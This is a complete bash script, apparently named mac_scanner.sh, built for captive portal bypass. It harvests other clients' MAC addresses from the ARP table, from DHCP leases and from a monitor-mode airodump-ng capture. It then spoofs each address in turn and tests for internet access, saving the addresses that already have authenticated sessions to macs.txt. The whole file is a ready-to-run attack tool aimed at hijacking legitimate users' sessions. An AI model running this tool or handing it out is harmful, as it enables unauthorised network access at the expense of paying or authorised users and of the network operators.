#!/bin/bash
# MAC Address Scanner and Validator
# Purpose: Scans network for MAC addresses and tests which ones are authenticated
# Automatically builds a list of working MAC addresses for captive portal bypass

# run as root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root. Use sudo."
   exit 1
fi

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
INTERFACE=${INTERFACE:-"wlan0"}
OUTPUT_FILE="macs.txt"
TEMP_SCAN_FILE="mac_scan_temp.txt"
SCAN_DURATION=30  # seconds for monitor mode capture

# Track statistics
TOTAL_FOUND=0
TOTAL_TESTED=0
TOTAL_AUTHENTICATED=0
TOTAL_FAILED=0

echo -e "${CYAN}"
cat << "EOF"
╔═══════════════════════════════════════╗
║   MAC Address Scanner & Validator    ║
║   Automated Network MAC Discovery    ║
╚═══════════════════════════════════════╝
EOF
echo -e "${NC}"

# Check dependencies
check_http_client() {
    if command -v curl &> /dev/null; then
        HTTP_CLIENT="curl"
    elif command -v wget &> /dev/null; then
        HTTP_CLIENT="wget"
    else
        echo -e "${RED}Error: Neither curl nor wget found. Cannot perform captive portal detection.${NC}"
        exit 1
    fi
}

check_http_client

# Detect if a captive portal is present (same as mac_changer.sh)
detect_captive_portal() {
    # Test Google's connectivity check (expects 204 No Content)
    if [ "$HTTP_CLIENT" = "curl" ]; then
        local response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 http://connectivitycheck.gstatic.com/generate_204 2>/dev/null)
        if [ "$response" = "204" ]; then
            return 0
        fi
    else
        if wget -q --spider --timeout=5 http://connectivitycheck.gstatic.com/generate_204 2>/dev/null; then
            return 0
        fi
    fi

    # Test Apple's captive portal detection
    if [ "$HTTP_CLIENT" = "curl" ]; then
        local apple_response=$(curl -s --max-time 5 http://captive.apple.com/hotspot-detect.html 2>/dev/null)
        if echo "$apple_response" | grep -q "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"; then
            return 0
        fi
    fi

    return 1
}

# Test if MAC address provides authenticated access
test_mac_authentication() {
    local mac=$1
    echo -e "${YELLOW}Testing MAC: $mac${NC}"

    # Save original MAC
    local original_mac=$(ip link show "$INTERFACE" | grep ether | awk '{print $2}')

    # Change to test MAC
    ip link set "$INTERFACE" down 2>/dev/null
    ip link set "$INTERFACE" address "$mac" 2>/dev/null
    ip link set "$INTERFACE" up 2>/dev/null

    # Wait for network to stabilize
    sleep 3

    # Test network connectivity
    local ping_success=false
    for target in 8.8.8.8 1.1.1.1; do
        if ping -c 1 -W 2 "$target" > /dev/null 2>&1; then
            ping_success=true
            break
        fi
    done

    if [ "$ping_success" = false ]; then
        echo -e "${RED}  ✗ No network connectivity${NC}"
        # Restore original MAC
        ip link set "$INTERFACE" down 2>/dev/null
        ip link set "$INTERFACE" address "$original_mac" 2>/dev/null
        ip link set "$INTERFACE" up 2>/dev/null
        return 1
    fi

    # Test for captive portal
    if detect_captive_portal; then
        echo -e "${GREEN}  ✓ AUTHENTICATED - Full internet access!${NC}"
        # Restore original MAC
        ip link set "$INTERFACE" down 2>/dev/null
        ip link set "$INTERFACE" address "$original_mac" 2>/dev/null
        ip link set "$INTERFACE" up 2>/dev/null
        return 0
    else
        echo -e "${YELLOW}  ✗ Not authenticated - captive portal detected${NC}"
        # Restore original MAC
        ip link set "$INTERFACE" down 2>/dev/null
        ip link set "$INTERFACE" address "$original_mac" 2>/dev/null
        ip link set "$INTERFACE" up 2>/dev/null
        return 1
    fi
}

# Scan using ARP table
scan_arp_table() {
    echo -e "${BLUE}[1/3] Scanning ARP table...${NC}"
    local count=0

    # Get MACs from ARP table
    if command -v arp &> /dev/null; then
        arp -a | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' >> "$TEMP_SCAN_FILE"
        count=$(wc -l < "$TEMP_SCAN_FILE")
        echo -e "${GREEN}  Found $count MAC addresses in ARP table${NC}"
    else
        # Use ip neigh as alternative
        ip neigh show | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' >> "$TEMP_SCAN_FILE"
        count=$(wc -l < "$TEMP_SCAN_FILE")
        echo -e "${GREEN}  Found $count MAC addresses via ip neigh${NC}"
    fi
}

# Scan using monitor mode (if available)
scan_monitor_mode() {
    echo -e "${BLUE}[2/3] Attempting monitor mode scan...${NC}"

    # Check if we can use monitor mode
    if ! command -v airodump-ng &> /dev/null; then
        echo -e "${YELLOW}  ⚠ airodump-ng not available, skipping monitor mode scan${NC}"
        return
    fi

    # Save current interface state
    local original_mac=$(ip link show "$INTERFACE" | grep ether | awk '{print $2}')

    echo -e "${YELLOW}  Enabling monitor mode (this will disconnect you)...${NC}"

    # Enable monitor mode
    airmon-ng check kill > /dev/null 2>&1
    ip link set "$INTERFACE" down 2>/dev/null
    airmon-ng start "$INTERFACE" > /dev/null 2>&1

    # Get monitor interface name
    local monitor_if=$(iw dev | grep -B 1 "type monitor" | grep Interface | awk '{print $2}')

    if [ -z "$monitor_if" ]; then
        echo -e "${RED}  ✗ Failed to enable monitor mode${NC}"
        return
    fi

    echo -e "${GREEN}  Monitor mode enabled on $monitor_if${NC}"
    echo -e "${YELLOW}  Capturing packets for $SCAN_DURATION seconds...${NC}"

    # Capture packets
    timeout $SCAN_DURATION airodump-ng "$monitor_if" --write /tmp/capture --output-format csv > /dev/null 2>&1

    # Extract MAC addresses from capture
    if [ -f /tmp/capture-01.csv ]; then
        # Get station MACs (connected clients)
        grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' /tmp/capture-01.csv | sort -u >> "$TEMP_SCAN_FILE"
        local count=$(grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' /tmp/capture-01.csv | wc -l)
        echo -e "${GREEN}  Captured $count MAC addresses from monitor mode${NC}"
        rm -f /tmp/capture-01.csv /tmp/capture-01.cap
    fi

    # Restore managed mode
    echo -e "${YELLOW}  Restoring managed mode...${NC}"
    ip link set "$monitor_if" down 2>/dev/null
    iw dev "$monitor_if" set type managed 2>/dev/null
    ip link set "$INTERFACE" down 2>/dev/null
    ip link set "$INTERFACE" address "$original_mac" 2>/dev/null
    ip link set "$INTERFACE" up 2>/dev/null
    service NetworkManager restart > /dev/null 2>&1

    echo -e "${GREEN}  Interface restored${NC}"
}

# Scan DHCP leases (if accessible)
scan_dhcp_leases() {
    echo -e "${BLUE}[3/3] Checking DHCP leases...${NC}"

    local lease_files=(
        "/var/lib/dhcp/dhclient.leases"
        "/var/lib/dhcpcd/*.lease"
        "/var/lib/NetworkManager/*.lease"
    )

    local found=false
    for lease_file in "${lease_files[@]}"; do
        if [ -f "$lease_file" ] || ls $lease_file 2>/dev/null; then
            grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' $lease_file >> "$TEMP_SCAN_FILE" 2>/dev/null
            found=true
        fi
    done

    if [ "$found" = true ]; then
        echo -e "${GREEN}  Found additional MACs in DHCP leases${NC}"
    else
        echo -e "${YELLOW}  ⚠ No accessible DHCP lease files${NC}"
    fi
}

# Main execution
main() {
    echo -e "${YELLOW}Target interface: $INTERFACE${NC}"
    echo -e "${YELLOW}Output file: $OUTPUT_FILE${NC}\n"

    # Check if interface exists
    if ! ip link show "$INTERFACE" > /dev/null 2>&1; then
        echo -e "${RED}Error: Interface $INTERFACE not found${NC}"
        exit 1
    fi

    # Initialize temp file
    > "$TEMP_SCAN_FILE"

    echo -e "${CYAN}═══════════════════════════════════════${NC}"
    echo -e "${CYAN}Phase 1: MAC Address Discovery${NC}"
    echo -e "${CYAN}═══════════════════════════════════════${NC}\n"

    # Run all scan methods
    scan_arp_table
    scan_dhcp_leases

    # Ask user if they want to do monitor mode scan
    echo -e "\n${YELLOW}Monitor mode scan captures more MACs but disconnects your network.${NC}"
    read -p "Perform monitor mode scan? (y/N): " do_monitor
    if [[ "$do_monitor" =~ ^[Yy]$ ]]; then
        scan_monitor_mode
    fi

    # Process discovered MACs
    echo -e "\n${CYAN}═══════════════════════════════════════${NC}"
    echo -e "${CYAN}Phase 2: Deduplication & Validation${NC}"
    echo -e "${CYAN}═══════════════════════════════════════${NC}\n"

    # Remove duplicates and sort
    sort -u "$TEMP_SCAN_FILE" -o "$TEMP_SCAN_FILE"
    TOTAL_FOUND=$(wc -l < "$TEMP_SCAN_FILE")

    echo -e "${GREEN}Total unique MAC addresses found: $TOTAL_FOUND${NC}\n"

    if [ "$TOTAL_FOUND" -eq 0 ]; then
        echo -e "${RED}No MAC addresses found. Try running with monitor mode scan.${NC}"
        rm -f "$TEMP_SCAN_FILE"
        exit 1
    fi

    # Ask if user wants to test MACs
    echo -e "${YELLOW}Testing MACs will temporarily change your MAC address for each test.${NC}"
    echo -e "${YELLOW}This process may take several minutes depending on the number of MACs.${NC}"
    read -p "Test all discovered MACs for authentication? (y/N): " do_test

    if [[ "$do_test" =~ ^[Yy]$ ]]; then
        echo -e "\n${CYAN}═══════════════════════════════════════${NC}"
        echo -e "${CYAN}Phase 3: Authentication Testing${NC}"
        echo -e "${CYAN}═══════════════════════════════════════${NC}\n"

        # Backup existing macs.txt
        if [ -f "$OUTPUT_FILE" ]; then
            cp "$OUTPUT_FILE" "${OUTPUT_FILE}.backup"
            echo -e "${YELLOW}Backed up existing $OUTPUT_FILE to ${OUTPUT_FILE}.backup${NC}\n"
        fi

        # Clear output file and add header
        cat > "$OUTPUT_FILE" << EOF
# Authenticated MAC Addresses
# Generated by mac_scanner.sh on $(date)
# These MACs have been tested and confirmed to have network access

EOF

        # Test each MAC
        while IFS= read -r mac; do
            [[ -z "$mac" ]] && continue
            ((TOTAL_TESTED++))

            echo -e "${CYAN}[$TOTAL_TESTED/$TOTAL_FOUND]${NC} Testing $mac..."

            if test_mac_authentication "$mac"; then
                echo "$mac" >> "$OUTPUT_FILE"
                ((TOTAL_AUTHENTICATED++))
            else
                ((TOTAL_FAILED++))
            fi

            echo ""
        done < "$TEMP_SCAN_FILE"

        echo -e "\n${CYAN}═══════════════════════════════════════${NC}"
        echo -e "${CYAN}Results Summary${NC}"
        echo -e "${CYAN}═══════════════════════════════════════${NC}"
        echo -e "${GREEN}Total MACs discovered:    $TOTAL_FOUND${NC}"
        echo -e "${BLUE}Total MACs tested:        $TOTAL_TESTED${NC}"
        echo -e "${GREEN}✓ Authenticated MACs:     $TOTAL_AUTHENTICATED${NC}"
        echo -e "${RED}✗ Failed/Blocked MACs:    $TOTAL_FAILED${NC}"
        echo -e "\n${GREEN}Authenticated MACs saved to: $OUTPUT_FILE${NC}"

    else
        # Just save all discovered MACs without testing
        echo -e "\n${YELLOW}Saving all discovered MACs without testing...${NC}"

        # Backup existing file
        if [ -f "$OUTPUT_FILE" ]; then
            cp "$OUTPUT_FILE" "${OUTPUT_FILE}.backup"
        fi

        # Save with header
        cat > "$OUTPUT_FILE" << EOF
# Discovered MAC Addresses
# Generated by mac_scanner.sh on $(date)
# WARNING: These MACs have NOT been tested for authentication

EOF
        cat "$TEMP_SCAN_FILE" >> "$OUTPUT_FILE"
        echo -e "${GREEN}Saved $TOTAL_FOUND MAC addresses to $OUTPUT_FILE${NC}"
        echo -e "${YELLOW}Note: MACs have not been tested. Run with testing to filter authenticated ones.${NC}"
    fi

    # Cleanup
    rm -f "$TEMP_SCAN_FILE"

    echo -e "\n${GREEN}✓ Scan complete!${NC}"
}

# Run main function
main
